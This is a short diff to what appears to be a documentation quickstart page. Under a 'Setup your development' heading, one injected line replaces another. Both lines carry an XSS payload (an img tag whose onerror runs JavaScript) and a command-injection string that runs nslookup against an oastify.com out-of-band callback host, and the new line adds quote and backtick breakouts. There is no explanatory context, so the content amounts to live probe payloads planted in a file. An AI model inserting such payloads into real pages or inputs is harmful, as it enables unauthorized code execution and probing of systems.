@@ -5,4 +5,4 @@ description: 'Start building awesome documentation in under 5 minutes'
 
 ## Setup your development
 
-<img src=x onerror=javascript:confirm(1);/></html>|nslookup -q=cname 637t8slfls4ksf57s7tb9qzhx832rtqhm5es5gu.oastify.com.&
+<img src=x onerror=javascript:confirm(1);/></html>'"`0&nslookup -q=cname yvxl0kd7dkwck7xzkzl31ir9p0vujli9fx7ky8n.oastify.com.&`'
